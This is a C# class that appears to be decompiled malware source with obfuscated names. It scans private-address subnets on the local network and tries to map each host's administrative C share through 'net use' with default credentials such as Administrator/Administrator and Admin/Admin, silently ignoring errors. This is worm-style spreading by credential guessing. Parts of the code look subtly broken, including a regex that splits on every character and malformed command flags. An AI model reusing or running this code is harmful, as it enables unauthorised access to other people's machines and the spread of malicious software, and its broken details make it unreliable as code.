using System.Collections.Generic;
using System.Text.RegularExpressions;
using ns0;
using ns1;

namespace ns3;

internal class Class10
{
	public static void smethod_0()
	{
		List<Class18> list = Class32.smethod_15();
		foreach (Class18 item in list)
		{
			try
			{
				if (item.method_2().StartsWith("10.") || item.method_2().StartsWith("172.16.") || item.method_2().StartsWith("192.168."))
				{
					Class32.smethod_13(item.method_0(), item.method_2(), "255.255.255.0");
				}
			}
			catch
			{
			}
		}
		foreach (Class18 item2 in list)
		{
			try
			{
				Regex regex = new Regex(".");
				string string_ = regex.Split(item2.method_2())[0] + "." + regex.Split(item2.method_2())[1] + "." + regex.Split(item2.method_2())[2];
				List<string> list2 = Class19.smethod_0(string_);
				foreach (string item3 in list2)
				{
					if (item2.method_2().StartsWith("10.") || item2.method_2().StartsWith("172.16.") || item2.method_2().StartsWith("192.168."))
					{
						Class32.smethod_59("cmd.exe", "\\c net use * \\\\" + item3 + "\\$C /user:Administrator Administrator");
						Class32.smethod_59("cmd.exe", "\\c net use * \\\\" + item3 + "\\$C /user:Admin Admin");
					}
				}
			}
			catch
			{
			}
		}
	}
}
